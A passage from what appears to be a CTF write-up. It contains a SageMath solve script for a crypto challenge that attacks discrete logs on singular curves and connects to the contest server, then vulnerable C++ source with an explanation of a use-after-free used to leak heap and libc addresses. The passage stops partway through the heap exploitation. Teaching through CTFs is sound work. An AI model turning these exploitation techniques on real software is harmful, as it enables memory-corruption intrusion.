><span class=base ><span class=strut  style="height:0.975em;vertical-align:-0.2861em;"></span><span class=mord ><span class="mord mathbb">F</span><span class=msupsub ><span class="vlist-t vlist-t2"><span class=vlist-r ><span class=vlist  style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class=vlist-s >​</span></span><span class=vlist-r ><span class=vlist  style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>. </p> </ol> <p>In the final case, the cardinality of the group is <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mn>2</mn></msup><mo>−</mo><mn>1</mn><mo>=</mo><mo stretchy=false >(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy=false >)</mo><mo stretchy=false >(</mo><mi>p</mi><mo>+</mo><mn>1</mn><mo stretchy=false >)</mo></mrow><annotation encoding="application/x-tex">p^2 - 1 = (p - 1)(p + 1)</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:1.0085em;vertical-align:-0.1944em;"></span><span class=mord ><span class="mord mathnormal">p</span><span class=msupsub ><span class=vlist-t ><span class=vlist-r ><span class=vlist  style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class=pstrut  style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >−</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6444em;"></span><span class=mord >1</span><span class=mspace  style="margin-right:0.2778em;"></span><span class=mrel >=</span><span class=mspace  style="margin-right:0.2778em;"></span></span><span class=base ><span class=strut  style="height:1em;vertical-align:-0.25em;"></span><span class=mopen >(</span><span class="mord mathnormal">p</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >−</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:1em;vertical-align:-0.25em;"></span><span class=mord >1</span><span class=mclose >)</span><span class=mopen >(</span><span class="mord mathnormal">p</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:1em;vertical-align:-0.25em;"></span><span class=mord >1</span><span class=mclose >)</span></span></span></span>, and so one can hope to make DLP easy by finding a prime <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> such that both <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p - 1</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >−</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6444em;"></span><span class=mord >1</span></span></span></span> and <span class=katex ><span class=katex-mathml ><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p + 1</annotation></semantics></math></span><span class=katex-html  aria-hidden=true ><span class=base ><span class=strut  style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class=mspace  style="margin-right:0.2222em;"></span><span class=mbin >+</span><span class=mspace  style="margin-right:0.2222em;"></span></span><span class=base ><span class=strut  style="height:0.6444em;"></span><span class=mord >1</span></span></span></span> are smooth. </p> <p>Originally, I thought these primes would be impossible to find, but after some digging I found a table of such &quot;twin-smooth&quot; integers in a Github repository for research conducted by <a href="https://github.com/microsoft/twin-smooth-integers/">Costello et al. &#40;2020&#41;</a> at Microsoft. </p> <p>With our special prime in hand, we can now efficiently tackle all three cases of the reduction. Below is an implementation of the solution in SageMath </p> <pre><code class="python hljs"><span class=hljs-comment >#!/usr/bin/env python3</span>
+<span class=hljs-keyword >import</span> secrets
+<span class=hljs-keyword >from</span> pwn <span class=hljs-keyword >import</span> *
+<span class=hljs-keyword >import</span> base64
+
+context.log_level = <span class=hljs-string >&quot;debug&quot;</span>
+<span class=hljs-keyword >from</span> Crypto.Util.number <span class=hljs-keyword >import</span> *
+
+
+QUERY_NUM = <span class=hljs-number >250</span>
+PREC = <span class=hljs-number >8</span>
+PRIME_BITS = <span class=hljs-number >200</span>
+
+
+<span class=hljs-comment ># From https://github.com/microsoft/twin-smooth-integers/blob/main/pte_sieve/results/</span>
+p = <span class=hljs-number >9355816148700659051640061440899400676699704943594616366140933205827791968821466084194144092358933402872320699667710483870980437363744475484988193779026749</span>
+k = Qp(p, PREC)
+R = k.integer_ring()
+p = k.prime()
+Fp = GF(p)
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">transfer_to_Zp</span>(<span class=hljs-params >P, Q, ec</span>):
+    x_min = <span class=hljs-built_in >min</span>(P[<span class=hljs-number >0</span>], Q[<span class=hljs-number >0</span>], key=<span class=hljs-keyword >lambda</span> x: x.valuation())
+    y_min = <span class=hljs-built_in >min</span>(P[<span class=hljs-number >1</span>], Q[<span class=hljs-number >1</span>], key=<span class=hljs-keyword >lambda</span> x: x.valuation())
+
+    B = <span class=hljs-number >0</span>
+    X = Y = A = -<span class=hljs-number >1</span>
+
+    <span class=hljs-keyword >def</span> <span class="hljs-title function_">too_small</span>(<span class=hljs-params >X, Y, A, B</span>):
+        <span class=hljs-keyword >return</span> <span class=hljs-built_in >any</span>(
+            (
+                X &lt; <span class=hljs-built_in >abs</span>(x_min.valuation()),
+                Y &lt; <span class=hljs-built_in >abs</span>(y_min.valuation()),
+                A &lt; <span class=hljs-built_in >abs</span>(ec.a4().valuation()),
+                B &lt; <span class=hljs-built_in >abs</span>(ec.a6().valuation()),
+            )
+        )
+
+    <span class=hljs-keyword >while</span> too_small(X, Y, A, B):
+        B += <span class=hljs-number >6</span>
+        X = B // <span class=hljs-number >3</span>
+        Y = B // <span class=hljs-number >2</span>
+        A = B - X
+
+    xp = Fp(P[<span class=hljs-number >0</span>] * p ^ (X))
+    yp = Fp(P[<span class=hljs-number >1</span>] * p ^ (Y))
+    xq = Fp(Q[<span class=hljs-number >0</span>] * p ^ (X))
+    yq = Fp(Q[<span class=hljs-number >1</span>] * p ^ (Y))
+
+    a = Fp(ec.a4() * p ** (A))
+    b = Fp(ec.a6() * p ** (B))
+    <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;B =&quot;</span>, B)
+    <span class=hljs-keyword >assert</span> yp ^ <span class=hljs-number >2</span> == xp ^ <span class=hljs-number >3</span> + a * xp + b
+    <span class=hljs-keyword >return</span> xp, yp, xq, yq, a, b
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">singular_attack</span>(<span class=hljs-params >xp, yp, xq, yq, a, b</span>):
+    FpX = PolynomialRing(Fp, <span class=hljs-string >&quot;X&quot;</span>)
+    X = FpX.gen(<span class=hljs-number >0</span>)
+    f = X ^ <span class=hljs-number >3</span> + a * X + b
+
+    roots = f.roots()
+    <span class=hljs-comment ># Singular point is a cusp.</span>
+    <span class=hljs-keyword >if</span> <span class=hljs-built_in >len</span>(roots) == <span class=hljs-number >1</span>:
+        <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;Singular point is a cusp&quot;</span>)
+        alpha = roots[<span class=hljs-number >0</span>][<span class=hljs-number >0</span>]
+        u = (xp - alpha) / yp
+        v = (xq - alpha) / yq
+        <span class=hljs-keyword >return</span> <span class=hljs-built_in >int</span>(v / u), u.order()
+
+    <span class=hljs-comment ># Singular point is a node.</span>
+    <span class=hljs-keyword >if</span> <span class=hljs-built_in >len</span>(roots) == <span class=hljs-number >2</span>:
+        <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;Singular point is a node&quot;</span>)
+        <span class=hljs-keyword >if</span> roots[<span class=hljs-number >0</span>][<span class=hljs-number >1</span>] == <span class=hljs-number >2</span>:
+            alpha = roots[<span class=hljs-number >0</span>][<span class=hljs-number >0</span>]
+            beta = roots[<span class=hljs-number >1</span>][<span class=hljs-number >0</span>]
+        <span class=hljs-keyword >elif</span> roots[<span class=hljs-number >1</span>][<span class=hljs-number >1</span>] == <span class=hljs-number >2</span>:
+            alpha = roots[<span class=hljs-number >1</span>][<span class=hljs-number >0</span>]
+            beta = roots[<span class=hljs-number >0</span>][<span class=hljs-number >0</span>]
+        <span class=hljs-keyword >else</span>:
+            <span class=hljs-keyword >raise</span> ValueError(<span class=hljs-string >&quot;Expected root with multiplicity 2.&quot;</span>)
+
+        t = (alpha - beta).sqrt()
+        u = (yp + t * (xp - alpha)) / (yp - t * (xp - alpha))
+        v = (yq + t * (xq - alpha)) / (yq - t * (xq - alpha))
+
+        <span class=hljs-keyword >return</span> <span class=hljs-built_in >int</span>(v.log(u, u.multiplicative_order())), u.multiplicative_order()
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">proof_of_work</span>(<span class=hljs-params >conn</span>):
+    proof = conn.recvline_startswith(<span class=hljs-string >b&quot;Submit&quot;</span>).decode()
+    command = re.search(<span class=hljs-string >r&quot;`(.*)`&quot;</span>, proof).group(<span class=hljs-number >1</span>)
+    conn2 = process(command.split())
+    response = conn2.recvall().decode()
+    ans = response[<span class=hljs-built_in >len</span>(<span class=hljs-string >&quot;hashcash stamp: &quot;</span>) :]
+    conn.sendline(ans)
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">sage_decode</span>(<span class=hljs-params >obj</span>):
+    <span class=hljs-keyword >from</span> sage.misc.persist <span class=hljs-keyword >import</span> SageUnpickler
+    <span class=hljs-keyword >from</span> base64 <span class=hljs-keyword >import</span> b64decode
+
+    <span class=hljs-keyword >return</span> SageUnpickler.loads(b64decode(obj))
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">sage_encode</span>(<span class=hljs-params >obj</span>):
+    <span class=hljs-keyword >from</span> sage.misc.persist <span class=hljs-keyword >import</span> SagePickler
+    <span class=hljs-keyword >from</span> base64 <span class=hljs-keyword >import</span> b64encode
+
+    <span class=hljs-keyword >return</span> b64encode(SagePickler.dumps(obj)).decode(<span class=hljs-string >&quot;ascii&quot;</span>)
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">solve</span>():
+    <span class=hljs-comment ># conn = process([&quot;sage&quot;, &quot;problem.sage&quot;])</span>
+    conn = connect(<span class=hljs-string >&quot;34.146.145.253&quot;</span>, <span class=hljs-number >16180</span>)
+    proof_of_work(conn)
+    conn.sendlineafter(<span class=hljs-string >b&quot;Send your prime: &quot;</span>, <span class=hljs-built_in >str</span>(p).encode())
+    <span class=hljs-built_in >round</span> = <span class=hljs-number >0</span>
+    <span class=hljs-keyword >while</span> <span class=hljs-literal >True</span>:
+        ec = sage_decode(conn.recvline().decode())
+        P = sage_decode(conn.recvline().decode())
+        Q = sage_decode(conn.recvline().decode())
+
+        curr_d = <span class=hljs-number >0</span>
+        mult = <span class=hljs-number >1</span>
+        <span class=hljs-keyword >while</span> <span class=hljs-keyword >not</span> Q.is_zero():
+            xp, yp, xq, yq, a, b = transfer_to_Zp(P, Q, ec)
+            <span class=hljs-built_in >print</span>(<span class=hljs-string >f&quot;a, b = <span class=hljs-subst >{a}</span>, <span class=hljs-subst >{b}</span>&quot;</span>)
+            <span class=hljs-built_in >print</span>(<span class=hljs-string >f&quot;xp, yp = <span class=hljs-subst >{xp}</span>, <span class=hljs-subst >{yp}</span>&quot;</span>)
+            <span class=hljs-built_in >print</span>(<span class=hljs-string >f&quot;xq, yq = <span class=hljs-subst >{xq}</span>, <span class=hljs-subst >{yq}</span>&quot;</span>)
+            d, order = singular_attack(xp, yp, xq, yq, a, b)
+            <span class=hljs-comment ># Shift to higher powers</span>
+            curr_d += d * mult
+            mult *= order
+            Q = Q - d * P
+            P = order * P
+
+        conn.sendlineafter(<span class=hljs-string >b&quot;Send your answer: &quot;</span>, <span class=hljs-built_in >str</span>(curr_d).encode())
+        <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;FINISHED&quot;</span>, <span class=hljs-built_in >round</span>)
+        <span class=hljs-built_in >round</span> += <span class=hljs-number >1</span>
+
+
+<span class=hljs-keyword >if</span> __name__ == <span class=hljs-string >&quot;__main__&quot;</span>:
+    solve()
+    <span class=hljs-comment ># TSGCTF{BAD r3duCT1oN IS n0t 5o bAD!}</span></code></pre> <h2 id=fl_support_center_pwn ><a href="#fl_support_center_pwn" class=header-anchor >FL Support Center &#40;pwn&#41;</a></h2> <p>In this challenge, we are given a C&#43;&#43; application which uses two <code>std::map&lt;std::string, std::string&gt;</code> maps to store contacts and messages.</p> <pre><code class="cpp hljs"><span class=hljs-comment >// g++ -o fl_support_center main.cpp</span>
+<span class=hljs-meta >#<span class=hljs-keyword >include</span> <span class=hljs-string >&lt;iostream&gt;</span></span>
+<span class=hljs-meta >#<span class=hljs-keyword >include</span> <span class=hljs-string >&lt;limits&gt;</span></span>
+<span class=hljs-meta >#<span class=hljs-keyword >include</span> <span class=hljs-string >&lt;map&gt;</span></span>
+
+<span class=hljs-meta >#<span class=hljs-keyword >define</span> MAX_CONTACT 2</span>
+<span class=hljs-meta >#<span class=hljs-keyword >define</span> MAX_SUPPORT_CONTACT 2</span>
+
+<span class=hljs-type >unsigned</span> <span class=hljs-type >int</span> contact = <span class=hljs-number >0</span>;
+<span class=hljs-type >unsigned</span> <span class=hljs-type >int</span> support_contact = <span class=hljs-number >0</span>;
+
+<span class=hljs-function ><span class=hljs-type >void</span> <span class=hljs-title >add</span><span class=hljs-params >(std::map&lt;std::string, std::string&gt; &amp;friends_list,
+         std::map&lt;std::string, std::string&gt; &amp;black_list)</span> </span>{
+  std::string name;
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Name: &quot;</span>;
+  std::cin &gt;&gt; name;
+
+  <span class=hljs-keyword >if</span> (<span class=hljs-keyword >auto</span> it = black_list.<span class=hljs-built_in >find</span>(name); it != black_list.<span class=hljs-built_in >end</span>()) {
+    <span class=hljs-keyword >if</span> (black_list[name] != <span class=hljs-string >&quot;&quot;</span>) {
+      std::cout &lt;&lt; <span class=hljs-string >&quot;Reported user&quot;</span> &lt;&lt; std::endl;
+      <span class=hljs-keyword >return</span>;
+    }
+  }
+
+  <span class=hljs-keyword >if</span> (name.<span class=hljs-built_in >size</span>() &gt;= <span class=hljs-number >0x100</span>) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Too long&quot;</span> &lt;&lt; std::endl;
+  } <span class=hljs-keyword >else</span> {
+    friends_list[name] = <span class=hljs-string >&quot;&quot;</span>;
+  }
+  <span class=hljs-keyword >return</span>;
+}
+
+<span class=hljs-function ><span class=hljs-type >void</span> <span class=hljs-title >message</span><span class=hljs-params >(std::map&lt;std::string, std::string&gt; &amp;friends_list)</span> </span>{
+  std::string name;
+  std::string message;
+
+  contact++;
+  <span class=hljs-keyword >if</span> (contact &gt; MAX_CONTACT) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;The trial ends here.&quot;</span> &lt;&lt; std::endl;
+    <span class=hljs-keyword >return</span>;
+  }
+
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Name: &quot;</span>;
+  std::cin &gt;&gt; name;
+
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Message: &quot;</span>;
+  std::cin &gt;&gt; message;
+
+  <span class=hljs-keyword >if</span> (message.<span class=hljs-built_in >size</span>() &gt;= <span class=hljs-number >0x100</span>) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Too long&quot;</span> &lt;&lt; std::endl;
+    <span class=hljs-keyword >return</span>;
+  }
+
+  <span class=hljs-keyword >try</span> {
+    std::string old = friends_list.<span class=hljs-built_in >at</span>(name);
+    <span class=hljs-keyword >if</span> (old != <span class=hljs-string >&quot;&quot;</span>) {
+      std::string yon;
+      std::cout &lt;&lt; <span class=hljs-string >&quot;Do you want to delete the sent message: &quot;</span> &lt;&lt; old
+                &lt;&lt; <span class=hljs-string >&quot;(yes or no)&quot;</span> &lt;&lt; std::endl;
+      std::cout &lt;&lt; <span class=hljs-string >&quot;&gt; &quot;</span>;
+      std::cin &gt;&gt; yon;
+      <span class=hljs-keyword >if</span> (yon == <span class=hljs-string >&quot;yes&quot;</span>) {
+        friends_list.<span class=hljs-built_in >at</span>(name) = message;
+      }
+    } <span class=hljs-keyword >else</span> {
+      friends_list.<span class=hljs-built_in >at</span>(name) = message;
+    }
+  } <span class=hljs-built_in >catch</span> (<span class=hljs-type >const</span> std::out_of_range &amp;ex) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Invalid Name&quot;</span> &lt;&lt; std::endl;
+  }
+  <span class=hljs-keyword >return</span>;
+}
+
+<span class=hljs-function ><span class=hljs-type >void</span> <span class=hljs-title >list</span><span class=hljs-params >(std::map&lt;std::string, std::string&gt; &amp;friends_list)</span> </span>{
+  <span class=hljs-keyword >for</span> (<span class=hljs-keyword >auto</span> it : friends_list) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;----------------------------------------------&quot;</span> &lt;&lt; std::endl;
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Name: &quot;</span> &lt;&lt; it.first &lt;&lt; std::endl;
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Sent Message: &quot;</span> &lt;&lt; it.second &lt;&lt; std::endl;
+  }
+  std::cout &lt;&lt; <span class=hljs-string >&quot;----------------------------------------------&quot;</span> &lt;&lt; std::endl;
+  <span class=hljs-keyword >return</span>;
+}
+
+<span class=hljs-function ><span class=hljs-type >void</span> <span class=hljs-title >remove</span><span class=hljs-params >(std::map&lt;std::string, std::string&gt; &amp;friends_list,
+            std::map&lt;std::string, std::string&gt; &amp;black_list)</span> </span>{
+  std::string yon;
+  std::string name;
+  std::string message;
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Name: &quot;</span>;
+  std::cin &gt;&gt; name;
+
+  <span class=hljs-keyword >for</span> (<span class=hljs-keyword >auto</span> it = friends_list.<span class=hljs-built_in >begin</span>(); it != friends_list.<span class=hljs-built_in >end</span>();) {
+    <span class=hljs-keyword >auto</span> next = std::<span class=hljs-built_in >next</span>(it);
+
+    <span class=hljs-keyword >if</span> (it-&gt;first == name) {
+      <span class=hljs-keyword >if</span> (it-&gt;first != <span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>) {
+        friends_list.<span class=hljs-built_in >erase</span>(it);
+        <span class=hljs-keyword >if</span> (<span class=hljs-keyword >auto</span> it = black_list.<span class=hljs-built_in >find</span>(name); it != black_list.<span class=hljs-built_in >end</span>()) {
+          std::cout &lt;&lt; <span class=hljs-string >&quot;Already blacklisted&quot;</span> &lt;&lt; std::endl;
+          std::cout &lt;&lt; <span class=hljs-string >&quot;Report: &quot;</span>;
+          std::cin &gt;&gt; message;
+          <span class=hljs-keyword >if</span> (message.<span class=hljs-built_in >size</span>() &gt;= <span class=hljs-number >0x100</span>) {
+            std::cout &lt;&lt; <span class=hljs-string >&quot;Too long&quot;</span> &lt;&lt; std::endl;
+          } <span class=hljs-keyword >else</span> {
+            black_list[name] = message;
+          }
+        } <span class=hljs-keyword >else</span> {
+          black_list[name] = <span class=hljs-string >&quot;&quot;</span>;
+        }
+      }
+
+      <span class=hljs-keyword >if</span> (it-&gt;first == <span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>) {
+        support_contact++;
+        <span class=hljs-keyword >if</span> (contact &gt; MAX_SUPPORT_CONTACT) {
+          std::cout &lt;&lt; <span class=hljs-string >&quot;Too many contacts&quot;</span> &lt;&lt; std::endl;
+          <span class=hljs-keyword >return</span>;
+        }
+        std::cout &lt;&lt; <span class=hljs-string >&quot;Thank you for contacting FL*Support*Center.&quot;</span> &lt;&lt; std::endl;
+        std::cout &lt;&lt; <span class=hljs-string >&quot;Is there anything that didn&#x27;t meet your expectations?&quot;</span>
+                  &lt;&lt; std::endl;
+        std::cout &lt;&lt; <span class=hljs-string >&quot;Please let us know.&quot;</span> &lt;&lt; std::endl;
+
+        <span class=hljs-keyword >if</span> (it-&gt;second != <span class=hljs-string >&quot;&quot;</span>) {
+          std::cout &lt;&lt; <span class=hljs-string >&quot;Do you want to delete the sent message: &quot;</span> &lt;&lt; it-&gt;second
+                    &lt;&lt; <span class=hljs-string >&quot;(yes or no)&quot;</span> &lt;&lt; std::endl;
+          std::cout &lt;&lt; <span class=hljs-string >&quot;&gt; &quot;</span>;
+          std::cin &gt;&gt; yon;
+          <span class=hljs-keyword >if</span> (yon != <span class=hljs-string >&quot;yes&quot;</span>) {
+            <span class=hljs-keyword >break</span>;
+          }
+        }
+
+        std::cout &lt;&lt; <span class=hljs-string >&quot;Message: &quot;</span> &lt;&lt; std::endl;
+        std::cin &gt;&gt; message;
+        <span class=hljs-keyword >if</span> (message.<span class=hljs-built_in >size</span>() &gt;= <span class=hljs-number >0x100</span>) {
+          std::cout &lt;&lt; <span class=hljs-string >&quot;Too long&quot;</span> &lt;&lt; std::endl;
+        } <span class=hljs-keyword >else</span> {
+          it-&gt;second = message;
+        }
+      }
+    }
+    it = next;
+  }
+  <span class=hljs-keyword >return</span>;
+}
+
+<span class=hljs-function ><span class=hljs-type >int</span> <span class=hljs-title >main</span><span class=hljs-params >()</span> </span>{
+  <span class=hljs-type >int</span> choice;
+  std::map&lt;std::string, std::string&gt; friends_list = {
+      {<span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>, <span class=hljs-string >&quot;&quot;</span>}};
+  std::map&lt;std::string, std::string&gt; black_list = {};
+
+  <span class=hljs-keyword >while</span> (<span class=hljs-number >1</span>) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;1. Add\n2. Message\n3. List\n4. Remove\n5. Exit&quot;</span> &lt;&lt; std::endl;
+    std::cout &lt;&lt; <span class=hljs-string >&quot;&gt; &quot;</span>;
+    std::cin &gt;&gt; choice;
+
+    <span class=hljs-keyword >if</span> (std::cin.<span class=hljs-built_in >eof</span>()) {
+      <span class=hljs-built_in >exit</span>(<span class=hljs-number >0</span>);
+    }
+    <span class=hljs-keyword >if</span> (std::cin.<span class=hljs-built_in >fail</span>()) {
+      std::cout &lt;&lt; <span class=hljs-string >&quot;Invalid Option&quot;</span> &lt;&lt; std::endl;
+      std::cin.<span class=hljs-built_in >clear</span>();
+      std::cin.<span class=hljs-built_in >ignore</span>(std::numeric_limits&lt;std::streamsize&gt;::<span class=hljs-built_in >max</span>(), <span class=hljs-string >&#x27;\n&#x27;</span>);
+      <span class=hljs-keyword >continue</span>;
+    }
+
+    <span class=hljs-keyword >switch</span> (choice) {
+    <span class=hljs-keyword >case</span> <span class=hljs-number >1</span>:
+      <span class=hljs-built_in >add</span>(friends_list, black_list);
+      <span class=hljs-keyword >break</span>;
+    <span class=hljs-keyword >case</span> <span class=hljs-number >2</span>:
+      <span class=hljs-built_in >message</span>(friends_list);
+      <span class=hljs-keyword >break</span>;
+    <span class=hljs-keyword >case</span> <span class=hljs-number >3</span>:
+      <span class=hljs-built_in >list</span>(friends_list);
+      <span class=hljs-keyword >break</span>;
+    <span class=hljs-keyword >case</span> <span class=hljs-number >4</span>:
+      <span class=hljs-built_in >remove</span>(friends_list, black_list);
+      <span class=hljs-keyword >break</span>;
+    <span class=hljs-keyword >case</span> <span class=hljs-number >5</span>:
+      <span class=hljs-built_in >exit</span>(<span class=hljs-number >0</span>);
+
+    <span class=hljs-keyword >default</span>:
+      std::cout &lt;&lt; <span class=hljs-string >&quot;Invalid Option&quot;</span> &lt;&lt; std::endl;
+      <span class=hljs-keyword >break</span>;
+    }
+  }
+  <span class=hljs-keyword >return</span> <span class=hljs-number >0</span>;
+}</code></pre> <p>The main bug lies in the <code>remove&#40;&#41;</code> function. If we supply a name which exists in the map, then both the iterator <code>it</code> as well as the key <code>it-&gt;first</code> and value <code>it-&gt;second</code> will be freed upon reaching <code>friends_list.erase&#40;it&#41;</code>.</p> <pre><code class="cpp hljs"><span class=hljs-keyword >if</span> (it-&gt;first != <span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>) {
+  friends_list.<span class=hljs-built_in >erase</span>(it);
+  <span class=hljs-keyword >if</span> (<span class=hljs-keyword >auto</span> it = black_list.<span class=hljs-built_in >find</span>(name); it != black_list.<span class=hljs-built_in >end</span>()) {</code></pre> <p>At this point, the iterator <code>it</code> is invalidated, and must not be dereferenced.</p> <blockquote> <p>Iterators, pointers and references referring to elements removed by the function invalidated. All other iterators, pointers and references keep their validity. <a href="https://cplusplus.com/reference/map/map/erase/">&#40;<code>std::map::erase</code>&#41;</a></p> </blockquote> <p>however further down the function we read from <code>it-&gt;first</code> to compare its value against <code>&quot;FL*Support*Center@fl.support.center&quot;</code>.</p> <pre><code class="cpp hljs"><span class=hljs-keyword >if</span> (it-&gt;first == <span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>) {
+  support_contact++;
+  <span class=hljs-keyword >if</span> (contact &gt; MAX_SUPPORT_CONTACT) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Too many contacts&quot;</span> &lt;&lt; std::endl;
+    <span class=hljs-keyword >return</span>;
+  }</code></pre> <p>To exploit this, suppose the user we are removing has a name which is the same length as <code>&quot;FL*Support*Center@fl.support.center&quot;</code>, and further, suppose they have an existing blacklist entry. Such a user can be constructed by calling <code>add&#40;&#41;</code>, then <code>remove&#40;&#41;</code> then <code>add&#40;&#41;</code> again on a single user. When this user&#39;s entry gets erased, the chunk holding the user&#39;s name will be freed. Since the user has a blacklist entry, we will then be asked to supply a report message.</p> <pre><code class="julia hljs"><span class=hljs-keyword >if</span> (auto it = black_list.find(name); it != black_list.<span class=hljs-keyword >end</span>()) {
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Already blacklisted&quot;</span> &lt;&lt; std::endl;
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Report: &quot;</span>;
+  std::cin &gt;&gt; message;
+  <span class=hljs-keyword >if</span> (message.size() &gt;= <span class=hljs-number >0x100</span>) {
+    std::cout &lt;&lt; <span class=hljs-string >&quot;Too long&quot;</span> &lt;&lt; std::endl;
+  } <span class=hljs-keyword >else</span> {
+    black_list[name] = message;
+  }
+} <span class=hljs-keyword >else</span> {
+  black_list[name] = <span class=hljs-string >&quot;&quot;</span>;
+}</code></pre> <p>If we supply the message <code>&quot;FL*Support*Center@fl.support.center&quot;</code>, then the chunk which previously held the user&#39;s name will be reallocated to store this message. Afterwards, both <code>message</code> and <code>it-&gt;first</code> will point to the same location, and both will have the value of the support user&#39;s name. With this, we can execute the support functionality while <code>it</code> is a deleted iterator. Usually this is not possible due to the guards</p> <pre><code class="cpp hljs"><span class=hljs-keyword >if</span> (it-&gt;first != <span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>) {</code></pre>
+<p>and</p>
+<pre><code class="cpp hljs"><span class=hljs-keyword >if</span> (it-&gt;first == <span class=hljs-string >&quot;FL*Support*Center@fl.support.center&quot;</span>) {</code></pre>
+<p>which ensure both are mutually exclusive, so we have managed to violate an invariant of the <code>remove&#40;&#41;</code> function.</p>
+<p>Looking further at what this gives us, we see that when <code>it</code> is an invalidated iterator, the support functionality in <code>remove&#40;&#41;</code> makes two use-after-frees. The first occurs when the deleted user had a pre-existing message, in which case <code>it-&gt;second</code> is read and its contents are sent to the user. This can be used to leak heap and libc addresses.</p>
+<pre><code class="julia hljs"><span class=hljs-keyword >if</span> (it-&gt;second != <span class=hljs-string >&quot;&quot;</span>) {
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Do you want to delete the sent message: &quot;</span> &lt;&lt; it-&gt;second
+            &lt;&lt; <span class=hljs-string >&quot;(yes or no)&quot;</span> &lt;&lt; std::endl;
+  std::cout &lt;&lt; <span class=hljs-string >&quot;&gt; &quot;</span>;
+  std::cin &gt;&gt; yon;
+  <span class=hljs-keyword >if</span> (yon != <span class=hljs-string >&quot;yes&quot;</span>) {
+    <span class=hljs-keyword >break</span>;
+  }
+}</code></pre>
+<p>The second use-after-free occurs when a user supplied message is written directly to <code>it-&gt;second</code>. This gives us a write which we can use to corrupt heap pointers. </p>
+<pre><code class="julia hljs">std::cout &lt;&lt; <span class=hljs-string >&quot;Message: &quot;</span> &lt;&lt; std::endl;
+std::cin &gt;&gt; message;
+<span class=hljs-keyword >if</span> (message.size() &gt;= <span class=hljs-number >0x100</span>) {
+  std::cout &lt;&lt; <span class=hljs-string >&quot;Too long&quot;</span> &lt;&lt; std::endl;
+} <span class=hljs-keyword >else</span> {
+  it-&gt;second = message;
+}</code></pre>
+<p>To exploit the leak, we can repeatedly call <code>add&#40;&#41;, remove&#40;&#41;, add&#40;&#41;, remove&#40;&#41;</code> to allocate and then free chunks into the tcache. Note that two iterations of <code>add&#40;&#41;</code> and <code>remove&#40;&#41;</code> are required to get a single chunk into the tcache, since on the first iteration, any <code>it-&gt;first</code> strings which are freed by <code>remove&#40;&#41;</code> will be immediately reallocated to hold the key of the assignment</p>
+<pre><code class="cpp hljs">} <span class=hljs-keyword >else</span> {
+  black_list[name] = <span class=hljs-string >&quot;&quot;</span>;
+}</code></pre>
